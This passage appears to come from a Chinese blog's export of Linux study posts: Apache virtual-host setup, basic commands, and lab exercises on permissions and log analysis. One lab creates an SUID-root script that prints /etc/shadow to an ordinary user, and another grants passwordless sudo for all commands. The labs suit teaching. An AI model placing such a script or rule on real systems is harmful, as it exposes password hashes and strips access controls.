list-unit-files | grep http\nhttpd.service                              disabled \nhttpd@.service                             disabled \nhttpd.socket                               disabled \n\n#检查新增的apache进程\nps aux | grep httpd\n\n[root@localhost /]# ps aux | grep httpd\nroot      32866  0.0  1.3 273860 10700 ?        Ss   15:42   0:00 /usr/sbin/httpd -DFOREGROUND\napache    32870  0.0  1.0 286076  8244 ?        S    15:42   0:00 /usr/sbin/httpd -DFOREGROUND\napache    32872  0.0  1.1 1802624 9512 ?        Sl   15:42   0:00 /usr/sbin/httpd -DFOREGROUND\napache    32873  0.0  1.6 1933752 13600 ?       Sl   15:42   0:00 /usr/sbin/httpd -DFOREGROUND\napache    32876  0.0  1.1 1802624 9512 ?        Sl   15:42   0:00 /usr/sbin/httpd -DFOREGROUND\nroot      33313  0.0  0.1  12320   992 pts/0    S+   15:56   0:00 grep --color=auto httpd\n\n#检查新增日志文件\nls -l /var/log/httpd\n\n[root@localhost /]# ls -l /var/log/httpd\n总用量 4\n-rw-r--r--. 1 root root    0 8月   4 15:42 access_log\n-rw-r--r--. 1 root root 1036 8月   4 15:42 error_log\n\n#检查新增用户和组\ngrep apache /etc/passwd\ngrep apache /etc/group\n\n[root@localhost /]# grep apache /etc/group\napache:x:48:\n[root@localhost /]# grep apache /etc/passwd\napache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin\n```\n\n## 4.搭建静态页面\n\n以上我们已经搭建好apache服务，现在需要利用apache服务来搭建一个自己的网站\n\n```html\n#首先，需要将静态页面保存到apache的网站根目录/var/www/html下，名为index.html\n#以下是我自己的静态页面代码\n<!DOCTYPE html>\n<html lang=\"zh-CN\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>测试页面</title>\n    <style>\n        body {\n            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;\n            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);\n            display: flex;\n            justify-content: center;\n            align-items: center;\n            height: 100vh;\n            margin: 0;\n            padding: 20px;\n        }\n        h1 {\n            color: #333;\n            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.1);\n            font-size: 3rem;\n            animation: fadeIn 1.5s ease-in-out;\n        }\n        @keyframes fadeIn {\n            from {\n                opacity: 0;\n                transform: translateY(-20px);\n            }\n            to {\n                opacity: 1;\n                transform: translateY(0);\n            }\n        }\n    </style>\n</head>\n<body>\n    <h1>欢迎来到HacerkT的世界</h1>\n</body>\n</html>\n```\n\n保存好之后，访问一下静态页面\n\n```bash\n#查看一下自己的ip地址\nifconfig\n#然后用浏览器直接访问ip地址，成功访问之后证明网站搭建完毕\n```\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/20250804161900808.png)\n\n到此，网站已经搭建完毕！\n\n## 5.搭建第二网站\n\n搭建第二网站需要运用到apache的一个核心功能，虚拟主机，他允许单台服务器通过不同ip、域名、端口托管多个不同网站\n\n```\n三种方式\n基于域名：不同域名访问不同网站，如a.com和b.com\n基于ip：不同ip访问不同网站，如http://10.1.1.1和http://10.1.1.2\n基于端口：不同端口访问不同网站，如http://10.1.1.1:81和http://10.1.1.1:82\n```\n\n这里我们使用域名来搭建第二网站\n\n```bash\n#创建新的网站目录和日志目录，在/var/www下创建，例如/var/www/study/html和/var/www/study/log\nmkdir -p /var/www/study/html /var/www/study/log\n\n#新建日志文件，错误日志study_error.log和访问日志study_access.log\ntouch /var/www/study/log/study_error.log /var/www/study/log/study_access.log\n\n#修改配置文件，路径为/etc/httpd/conf.d目录下，创建一个新的配置文件，例如study.conf\nvim /etc/httpd/conf.d/study.conf\n\n<VirtualHost *:80>\nServerName study.com # 主域名\nServerAlias study1.com # 备用域名\nDocumentRoot /var/www/study/html # 网站根目录\nErrorLog /var/www/study/log/study_error.log # 错误日志\nCustomLog /var/www/study/log/study_access.log combined # 访问日志\n</VirtualHost>\n#需要注意，在配置文件的时候，不能加上#的内容，例如#主域名，这个要删除\n```\n\n做完这些之后，写第二网站的静态页面，同之前一样，但这里注意网站的路径为/var/www/study/html，所以html文件保存在这个路径下，以下是我第二个网页的代码\n\n这里需要注意一下，需要配置属主属组为apache，并配置权限\n\n```bash\nchown apache:apache /var/www/study/html/index.html\nchmod 755 /var/www/study/html/index.html\n```\n\n\n\n```html\n<!DOCTYPE html>\n<html lang=\"zh-CN\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>网络安全学习路线基础篇</title>\n    <style>\n        :root {\n            --primary-color: #2c3e50;\n            --secondary-color: #3498db;\n            --background-color: #f9f9f9;\n            --card-bg: #ffffff;\n            --text-color: #333333;\n        }\n\n        body {\n            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;\n            background-color: var(--background-color);\n            color: var(--text-color);\n            margin: 0;\n            padding: 20px;\n            line-height: 1.6;\n        }\n\n        .container {\n            max-width: 1200px;\n            margin: 0 auto;\n            padding: 20px;\n        }\n\n        h1 {\n            color: var(--primary-color);\n            text-align: center;\n            margin-bottom: 40px;\n            font-size: 2.5rem;\n            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.1);\n        }\n\n        .module {\n            background-color: var(--card-bg);\n            border-radius: 10px;\n            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);\n            padding: 25px;\n            margin-bottom: 30px;\n            transition: transform 0.3s ease;\n        }\n\n        .module:hover {\n            transform: translateY(-5px);\n        }\n\n        .module h2 {\n            color: var(--secondary-color);\n            border-bottom: 2px solid var(--secondary-color);\n            padding-bottom: 10px;\n            margin-bottom: 20px;\n        }\n\n        ul {\n            list-style-type: none;\n            padding: 0;\n        }\n\n        li {\n            padding: 8px 0;\n            border-bottom: 1px solid #eee;\n        }\n\n        li:last-child {\n            border-bottom: none;\n        }\n    </style>\n</head>\n<body>\n    <div class=\"container\">\n        <h1>网络安全学习路线基础篇</h1>\n        <div class=\"module\">\n            <h2>1. 操作系统基础</h2>\n            <ul>\n                <li>Windows</li>\n                <li>Linux</li>\n            </ul>\n        </div>\n        <div class=\"module\">\n            <h2>2. 计算机网络基础</h2>\n            <ul>\n                <li>网络设备</li>\n                <li>协议</li>\n                <li>数据包</li>\n            </ul>\n        </div>\n        <div class=\"module\">\n            <h2>3. 数据库基础</h2>\n            <ul>\n                <li>MySQL</li>\n                <li>MSSQL</li>\n                <li>Redis</li>\n            </ul>\n        </div>\n        <div class=\"module\">\n            <h2>4. 代码基础</h2>\n            <ul>\n                <li>PHP</li>\n                <li>JS</li>\n                <li>Python</li>\n                <li>Java</li>\n            </ul>\n        </div>\n    </div>\n</body>\n</html>\n```\n\n这里出现几个问题，当我们使用域名study.com访问的时候，访问的是其他的网站\n\n这里做了域名解析\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/20250804181159993.png)\n\n可以看到是其他ip，原因可能是因为在浏览器解析域名的时候是公网的DNS服务器，所以无法定位到你的虚拟机，但是可以通过命令行进行访问\n\n```t\ncurl -H \"Host: study.com\" http://192.168.xx.xx/\n```\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/20250804181518614.png)\n\n成功访问！证明我们的配置没有问题\n\n还有一个问题是，在浏览器上使用ip进行访问的时候，访问的是第二网页，那么我们之前通过ip访问的第一网页去哪了呢？？？？？\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/20250804181718943.png)\n\n原因是因为你在apache上开启了虚拟主机这个配置，并且配置了域名，让你的ip有了一个指向，目标就是你的域名，所以它会自动将域名和ip绑定，访问的路径自然就是你第二网页的路径/var/www/study/heml而不是默认网页/var/www/html，所以就造成了当浏览器输入IP进行访问的时候，访问的是你的第二网页。\n\n那有什么办法能访问到两个网页呢？？？？\n\n当然有，这需要做一个配置，新建一个虚拟配置文件，让这个配置文件指向你的默认页面\n\n```bash\n新建一个index.conf的配置文件，在/etc/httpd/conf.d/目录下\nvim /etc/httpd/conf.d/index.conf\n\n保存一下内容\n<VirtualHost *:80>\n    # 使用通配符\"_\"表示默认主机\n    ServerName _\n\n    # 明确指向Apache的默认目录\n    DocumentRoot /var/www/html\n\n    <Directory \"/var/www/html\">\n        Options -Indexes +FollowSymLinks\n        AllowOverride All\n        Require all granted\n    </Directory>\n\n\n</VirtualHost>\n```\n\n配置好后，编辑你的物理机的\"C:\\Windows\\System32\\drivers\\etc\\hosts\"配置文件\n\n```\n在末尾加上\n\n192.168.x.x  study.com www.study.com\n\n192.168.x.x是你虚拟机服务器的ip地址\n```\n\n配置完成之后，去浏览器清理dns缓存，直接ctrl+shift+delete\n\n然后在命令行里输入，ipconfig /flushdns，刷新dns解析缓存\n\n然后再次尝试在浏览器通过域名和ip进行访问\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/20250805110853545.png)\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/20250805110927235.png)\n\nOK，成功解决，ip和域名访问不冲突，当然还有一些其他的解决方式，比如修改/etc/httpd/conf/httpd.conf文件\n"},{"title":"“Linux常用基础命令”","url":"/2025/08/04/“Linux运维常用基础命令”/","content":"\n# linux常用基础命令\n\n## 一、文件管理与查询\n\n### 1.touch #创建文件\n\n用法：\n\n```bash\ntouch test.txt  #单个创建\ntouch test1.txt test2.txt  #批量创建\n```\n\n### 2.mkdir #创建目录\n\n用法：\n\n```bash\nmkdir 【选项】 目录名\n\nmkdir dir/  #单级创建\nmkdir -p dir1/dir2  #递归创建\n```\n\n### 3.rm #删除文件及目录\n\n用法：\n\n```bash\nrm 【选项】 文件名or目录名\n\nrm test.txt  #删除单个文件\nrm -r dir/  #删除整个目录及其以下所有内容\nrm -f test.txt  #强制删除\n```\n\n### 4.cp #复制文件或目录\n\n用法：\n\n```bash\ncp 【选项】 文件名or目录名 指定路径\n\ncp test.txt dir/  #将test.txt复制到dir/目录\ncp -r dir1/ dir2/  #将dir1递归复制到dir2\ncp -f dir1/ dir2/  #强制复制\ncp -i test.txt dir1/  #若有覆盖，提示确认\n```\n\n### 5.mv #移动文件或重命名\n\n用法：\n\n```bash\nmv 源文件 目标路径or名称\n\nmv old.txt nwe.txt  #重命名\nmv test.txt dir/  #移动test.txt到dir/目录\n```\n\n### 6.ls #查看目录\n\n用法：\n\n```bash\nls 【选项】\n\nls  #查看当前目录下所有文件\nls -a  #显示当前目录下的隐藏文件\nls -l  #长格式显示，显示各文件权限、所属主/组、时间等\nls -h  #人类可读的文件大小\nls -R  #递归显示子目录\n```\n\n### 7.cat #查看文件\n\n用法：\n\n```bash\ncat 【选项】 文件名\n\ncat test.txt  #查看test.txt文件的内容\ncat test1.txt test2.txt  #查看多个文件内容\ncat test1.txt test2.txt > test3.txt  #合并文件 \n\ncat -n  #显示行号\ncat -b  #显示行号（忽略空行）\ncat -s  #压缩连续空行为一行\ncat -E  #在行尾显示$符号\n```\n\n高阶用法：\n\n```bash\n创建文件\ncat > test.txt << EOF  #创建test.txt文件\n示例\n[root@localhost test]# cat > test789.txt <<EOF\n> qwer\n> EOF\n[root@localhost test]# cat test789.txt \nqwer\n```\n\n```bash\ncat test1.txt > test2.txt  #将test1的内容追加到test2末尾\n```\n\n### 8.tail #查看文件末尾内容\n\n用法：\n\n```bash\ntail 【选项】 文件名\n\ntail test.txt  #查看末尾10行内容\ntail -n 20 test.txt  #查看末尾20行，-n用于指定显示行数\ntail -f /var/log/message  #实时追踪变化\n```\n\n### 9.grep #进行正则匹配文本内容\n\n用法：\n\n```bash\ngrep 【选项】 “搜索模式” 文件名or目录\n\ngrep -i \"error\" file  #忽略大小写\ngrep -v \"debug\" file  #反向匹配，排除搜索模式\ngrep -n \"qwe\" file  #显示行号\ngrep -c \"eqwe\" file  #统计行数\ngrep -r \"123\" /etc/  #递归搜索目录\ngrep -w \"qwe\" file  #精确匹配\ngrep -o \"[0-9]\" file  #仅输出匹配内容\ngrep -A 12 \"qwe\" file  #显示匹配行以及后12行 \ngrep -B 14 \"qwe\" file  #显示匹配行以及前14行\ngrep -C 18 \"qwe\" file  #显示匹配行以及前后各18行\n```\n\n"},{"title":"linux实操1","url":"/2025/08/03/linux实操1/","content":"\n## 实验1：文件目录结构与基本命令操作\n\n1、在/tmp目录下创建如下目录结构：\n\n```bash\n/tmp/test/\n├── dir1/\n│   ├── file1.txt\n│   └── file2.txt\n├── dir2/\n│   └── subdir/\n└── file3.txt\n```\n\n①cd /tmp #进入tmp文件夹\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/20250803152531969.png)\n\n②mkdir -p test/dir1 test/dir2/subdir #在当前目录创建一个test父级文件夹，并且创建dir1、dir2子文件夹，并在dir2中创建subdir子文件夹\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/20250803152731980.png)\n\n③cd test/dir1 #进入新建的dir1文件夹，touch file1.txt file2.txt #创建file1、file2两个txt文件\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/20250803152801030.png)\n\n④touch file3.txt #创建file3.txt文件\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/20250803152829966.png)\n\n⑤至此目录结构创建完成\n\n2、将dir1目录及其内容复制到dir2/subdir下\n\n①cp -r dir1 dir2/subdir #将dir1完全复制到subdir下\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/20250803152855231.png)\n\n3、查找/tmp目录下所有.txt文件并显示详细信息\n\n①find /tmp -type f -name \"*.txt\" -exec ls -l {} \\; #搜索/tmp目录下所有txt文件，并执行ls -l命令，{}替换为文件路径\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/20250803152920058.png)\n\n4、将file3.txt移动到dir1目录并重命名为newfile.txt\n\n①mv test/file3.txt test/dir1/newfile.txt #在tmp目录下，将file3.txt移动到dir1并重命名为newfile.txt，需要绝对路径\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/20250803152947625.png)\n\n## 实验2：用户与组管理\n\n1、创建用户user1、user2和组group1\n\nuseradd -m user1#创建user1，创建user2同理，groupadd group1 #创建组group1\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/20250803153018280.png)\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/20250803153039905.png)\n\n2、将user1和user2加入group1组\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/20250803153107450.png)\n\n3、创建目录/shared，设置权限使group1组成员可以读写，其他人无权限\n\nmkdir shared #创建shared目录\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/20250803153126630.png)\n\nchgrp group1 shared #将目录所属组变为group1，chmod 770 shared #将目录权限改为属组可读写，其他人无权限\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/20250803153144268.png)\n\n4、验证user1可以在/shared中创建文件，user3(非组成员)不能访问\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/20250803153210596.png)\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/20250803153224472.png)\n\n## 实验3：权限管理(UGO)\n\n1、创建文件/data/secret.txt，内容为\"Top Secret\"\n\nmkdir /data #创建data目录，vim secret.txt #创建secret文件并编写内容\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/20250803153256986.png)\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/20250803153312410.png)\n\n2、设置权限：所有者root可读写，组admin可读，其他人无权限\n\ngroupadd admin #创建admin组\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/20250803153418797.png)\n\nchgrp admin secret.txt #将文件属组改为admin\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/20250803153434104.png)\n\nchmod 740 secret.txt #设置权限为root可读写，组admin可读，其他无权限\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/20250803153450867.png)\n\n\n\n3、创建用户testuser并尝试访问该文件验证权限\n\nuseradd testuser #创建testuser\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/20250803153513883.png)\n\nsu testuser #切换到testuser用户，cat secret.txt #获取文件，验证权限，无法访问，权限不够\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/20250803153529921.png)\n\n\n\n4、使用ACL添加testuser的读写权限\n\nsetfacl -m u:testuser:rw- secret.txt #给testuser设置权限，可读写secret.txt\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/20250803153548526.png)\n\n再次切换到testuser，cat secret.txt验证是否能访问，成功访问\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/20250803153603961.png)\n\n\n\n\n\n## 实验4：SUID权限应用\n\n1、创建脚本/usr/local/bin/showfile，内容为显示/etc/shadow文件内容\n\nvim /usr/local/bin/showfile.sh #创建脚本文件\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/20250803153655093.png)\n\nchmod u+x /usr/local/bin/showfile.sh  #给文件设置可执行权限\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/20250803153710345.png)\n\n2、设置脚本所有者为root并添加SUID权限\n\nchown root /usr/local/bin/showfile.sh   #设置脚本所有者为root\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/20250803153723810.png)\n\nchmod 4755 /usr/local/bin/showfile.sh #设置suid权限，4表示suid，也可使用chmod u+s来设置suid权限\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/20250803153748232.png)\n\n3、使用普通用户执行该脚本验证权限提升\n\nsu - user1  #切换到普通用户\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/20250803153804171.png)\n\ncat /usr/local/bin/showfile  #使用命令来验证能否查看脚本内容\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/20250803153822790.png)\n\n成功查看\n\n4、实验完成后移除SUID权限\n\nchmod 755 /usr/local/bin/showfile.sh  #移除suid权限\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/20250803153840253.png)\n\n要求：对脚本内容进行注释\n\n```bash\n#showfile\n\necho '#!/bin/bash\ncat /etc/shadow' > /usr/local/bin/showfile\nchmod +x /usr/local/bin/showfile\n```\n\n## 实验5：文件属性保护\n\n1、创建重要配置文件/etc/important.conf\n\ntouch /etc/important.conf #创建文件\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/20250803153925705.png)\n\n2、使用chattr命令防止文件被修改或删除\n\nchattr +i /etc/importtant.conf #设置i属性，防止修改删除\n\nlsattr /etc/importtant.conf #查看属性\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/20250803153944567.png)\n\n3、尝试修改和删除文件验证保护效果\n\nrm /etc/importtant.conf #删除文件\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/20250803153959428.png)\n\n4、恢复文件正常属性\n\nchattr =表示移除所有属性，移除后进行验证，是否能删除\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/20250803154014963.png)\n\n成功删除\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/20250803154028650.png)\n\n\n\n## 实验6：sudo权限配置\n\n1、创建用户admin和组sudoadmin\n\nuseradd admin #创建用户，groupadd admin #创建组\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/20250803154043700.png)\n\n此时admin用户无法使用sudo无密码执行\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/20250803154057227.png)\n\n2、配置sudo使sudoadmin组成员可以执行所有命令无需密码\n\nvisudo修改配置文件，添加%sudoadmin ALL=(ALL:ALL) NOPASSWD: ALL\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/20250803154115116.png)\n\n3、将admin用户加入sudoadmin组\n\nusermod -aG sudoadmin admin #将用户加入组\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/20250803154132357.png)\n\n4、验证admin用户可以使用sudo执行特权命令\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/20250803154145543.png)\n\n成功执行\n\n## 实验7：综合权限管理\n\n1、创建目录/project，属组为devteam\n\n先创建目录和组\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/20250803154200718.png)\n\n修改/project属组为devteam\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/20250803154213425.png)\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/20250803154229983.png)\n\n2、设置权限：组成员可读写，其他人只读\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/20250803154256184.png)\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/20250803154308399.png)\n\n3、设置SGID权限使新建文件自动继承组权限\n\nchmod g+s可设置sgid权限\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/20250803154321067.png)\n\n4、创建用户dev1、dev2并加入devteam组\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/20250803154332694.png)\n\n5、验证dev1创建的文件dev2可以编辑\n\n切换到dev1用户，在project目录下创建一个1.txt文件\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/20250803154343649.png)\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/20250803154354225.png)\n\n切换到dev2用户，尝试修改1.txt文件\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/20250803154409774.png)\n\n成功执行\n\n\n\n### 实验8：日志分析与安全审计：\n\n1、创建日志文件\n 将以下内容保存为 `/var/log/application.log`：\n\n```\n2024-03-15 09:10:22 [INFO] User 'admin' authenticated from 192.168.1.100 (session: SESS-7X2G9P)\n2024-03-15 09:11:05 [ERROR] Failed login attempt for user 'root' from 10.0.0.55 (reason: invalid password)\n2024-03-15 09:12:33 [WARNING] High CPU usage detected (92%) on server-node-01\n2024-03-15 09:13:17 [SECURITY] Sensitive file accessed: /etc/shadow by user 'backup'\n2024-03-15 09:14:02 [DEBUG] API request: GET /api/v1/users?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...\n2024-03-15 09:15:48 [INFO] Payment processed: $250.00 via Credit Card (ref: PAY-8832)\n2024-03-15 09:16:30 [ERROR] Database connection timeout (MySQL@10.0.0.100:3306)\n2024-03-15 09:17:11 [ALERT] SSH brute force detected from 45.33.12.88 (15 attempts)\n```\n\n2、设置权限\n\n```\nchmod 640 /var/log/application.log\nchown root:adm /var/log/application.log\n```\n\n**任务1.1**：统计日志中所有错误事件的数量\n\n**任务1.2**：提取所有包含IP地址的行（仅显示IP）\n\n**任务2.1**：查看`SECURITY`事件及其前后1行内容\n\n**任务3.1**：找出所有涉及金额的记录（含`$`符号）\n\n**扩展任务**：提取金额数值并计算总和\n\n​\t\t\t\t   时间范围统计：统计09:10-09:15期间的事件数量\n\n**任务4.1**：检测潜在暴力破解行为\n\n```bash\ngrep \"Failed login\\|brute force\" /var/log/application.log\n```\n\n编写自动化脚本，analyzer.sh，并使用chmod +x赋予执行权限\n\n```\n#!/bin/bash\n# 多功能日志分析工具\n# 用法：./analyzer.sh [日志文件路径]\n\nLOG_FILE=\"${1:-/var/log/syslog}\"  # 默认使用syslog，可指定其他文件\nTEMP_IP_FILE=\"/tmp/ips.tmp\"       # IP临时文件\nTEMP_AMOUNT_FILE=\"/tmp/amounts.tmp\" # 金额临时文件\n\n# 任务1.1: 统计错误事件数量\nanalyze_errors() {\n    echo \"===== 任务1.1: 错误事件统计 =====\"\n    local error_count=$(grep -i -E \"error|fail|critical|exception\" \"$LOG_FILE\" | wc -l)\n    echo \"总错误事件数量: $error_count\"\n    \n    # 错误类型细分\n    echo -e \"\\n错误类型分布:\"\n    grep -i -o -E \"error|fail|critical|exception\" \"$LOG_FILE\" | sort | uniq -c | sort -nr\n    echo\n}\n\n# 任务1.2: 提取所有IP地址\nextract_ips() {\n    echo \"===== 任务1.2: IP地址提取 =====\"\n    # 使用增强IP正则表达式\n    grep -E -o \"([0-9]{1,3}\\.){3}[0-9]{1,3}\" \"$LOG_FILE\" | sort -u > \"$TEMP_IP_FILE\"\n    echo \"找到唯一IP地址: $(wc -l < \"$TEMP_IP_FILE\")\"\n    echo -e \"\\n前10个IP:\"\n    head -n 10 \"$TEMP_IP_FILE\"\n    echo\n}\n\n# 任务2.1: 查看SECURITY事件及上下文\nshow_security_events() {\n    echo \"===== 任务2.1: SECURITY事件分析 =====\"\n    local security_count=$(grep -i \"SECURITY\" \"$LOG_FILE\" | wc -l)\n    echo \"找到SECURITY事件: $security_count\"\n    \n    if [ \"$security_count\" -gt 0 ]; then\n        echo -e \"\\nSECURITY事件及上下文 (前5个):\"\n        grep -i \"SECURITY\" -A 1 -B 1 \"$LOG_FILE\" | head -n 15\n    else\n        echo \"未找到SECURITY事件\"\n    fi\n    echo\n}\n\n# 任务3.1: 金额记录分析\nanalyze_amounts() {\n    echo \"===== 任务3.1: 金额记录分析 =====\"\n    # 查找所有包含$符号的行\n    grep \"\\$\" \"$LOG_FILE\" > \"$TEMP_AMOUNT_FILE\"\n    local amount_count=$(wc -l < \"$TEMP_AMOUNT_FILE\")\n    echo \"找到包含金额的记录: $amount_count\"\n    \n    if [ \"$amount_count\" -gt 0 ]; then\n        # 扩展任务: 提取金额并计算总和\n        echo -e \"\\n金额记录示例 (前5个):\"\n        head -n 5 \"$TEMP_AMOUNT_FILE\"\n        \n        # 提取金额数值\n        local total_amount=0\n        local amounts=()\n        while IFS= read -r line; do\n            # 匹配$后跟数字/小数点的金额\n            if [[ \"$line\" =~ \\$([0-9]+(\\.[0-9]{1,2})?) ]]; then\n                amount=\"${BASH_REMATCH[1]}\"\n                amounts+=(\"$amount\")\n                total_amount=$(awk \"BEGIN {printf \\\"%.2f\\\", $total_amount + $amount}\")\n            fi\n        done < \"$TEMP_AMOUNT_FILE\"\n        \n        echo -e \"\\n金额总和: \\$$total_amount\"\n        echo \"提取金额数量: ${#amounts[@]}\"\n    else\n        echo \"未找到金额记录\"\n    fi\n    echo\n}\n\n# 扩展任务: 时间范围统计\ntime_range_analysis() {\n    echo \"===== 扩展任务: 时间范围统计 (09:10-09:15) =====\"\n    # 根据日志格式调整时间匹配模式\n    local time_count=$(grep -E \"09:(1[0-4]|15)\" \"$LOG_FILE\" | wc -l)\n    echo \"09:10-09:15期间的事件数量: $time_count\"\n    \n    # 显示该时间段的事件类型分布\n    echo -e \"\\n事件类型分布:\"\n    grep -E \"09:(1[0-4]|15)\" \"$LOG_FILE\" | grep -o -E \"\\[[A-Z]+\\]|\\b[A-Z]{3,}\\b\" | sort | uniq -c | sort -nr | head -5\n    echo\n}\n\n# 任务4.1: 检测潜在暴力破解\ndetect_bruteforce() {\n    echo \"===== 任务4.1: 潜在暴力破解检测 =====\"\n    # 检测失败的登录尝试\n    echo \"检测失败的登录尝试...\"\n    local failed_logins=$(grep -i \"fail\" \"$LOG_FILE\" | grep -E \"login|auth|ssh\")\n    \n    if [ -n \"$failed_logins\" ]; then\n        # 提取IP和尝试次数\n        echo \"$failed_logins\" | grep -E -o \"([0-9]{1,3}\\.){3}[0-9]{1,3}\" | sort | uniq -c | sort -nr > \"$TEMP_IP_FILE\"\n        \n        local suspicious_count=0\n        echo -e \"\\n登录失败统计:\"\n        while IFS= read -r line; do\n            attempts=$(echo \"$line\" | awk '{print $1}')\n            ip=$(echo \"$line\" | awk '{print $2}')\n            \n            if [ \"$attempts\" -gt 5 ]; then\n                echo \"[!] 可疑: IP $ip 有 $attempts 次失败尝试\"\n                ((suspicious_count++))\n            else\n                echo \"[ ] 正常: IP $ip 有 $attempts 次失败尝试\"\n            fi\n        done < \"$TEMP_IP_FILE\"\n        \n        echo -e \"\\n检测到 $suspicious_count 个可疑IP\"\n    else\n        echo \"未找到失败登录记录\"\n    fi\n    echo\n}\n\n# 主函数\nmain() {\n    # 检查日志文件是否存在\n    if [ ! -f \"$LOG_FILE\" ]; then\n        echo \"错误: 日志文件不存在 - $LOG_FILE\"\n        exit 1\n    fi\n    \n    echo \"===== 开始分析日志: $LOG_FILE =====\"\n    echo \"文件大小: $(du -h \"$LOG_FILE\" | cut -f1)\"\n    echo \"最后修改: $(stat -c %y \"$LOG_FILE\")\"\n    echo \"总行数: $(wc -l < \"$LOG_FILE\")\"\n    echo\n    \n    # 执行所有分析任务\n    analyze_errors\n    extract_ips\n    show_security_events\n    analyze_amounts\n    time_range_analysis\n    detect_bruteforce\n    \n    # 清理临时文件\n    rm -f \"$TEMP_IP_FILE\" \"$TEMP_AMOUNT_FILE\"\n    \n    echo \"===== 分析完成 =====\"\n}\n\n# 执行主函数\nmain\n```\n\n执行后如图\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/20250803154427410.png)\n\n**任务5.1**：分析脚本文件生成安全事件报告\n\n```bash\necho \"安全事件报告\" > report.txt\t\t#输出安全事件报告标题到report中\ndate >> report.txt                  #输出日期到报告中\necho \"=== 高风险事件 ===\" >> report.txt    #输出高风险事件标题\ngrep -E \"SECURITY|ALERT\" /var/log/application.log >> report.txt   #匹配SECURITY和ALERT事件，并输出到报告中\necho \"=== 异常IP列表 ===\" >> report.txt #输出异常IP到报告中 \ngrep -Eo \"([0-9]{1,3}\\.){3}[0-9]{1,3}\" /var/log/application.log | sort -u >> report.txt    #匹配IP，并输出到报告中\n```\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/20250803154450789.png)\n"}]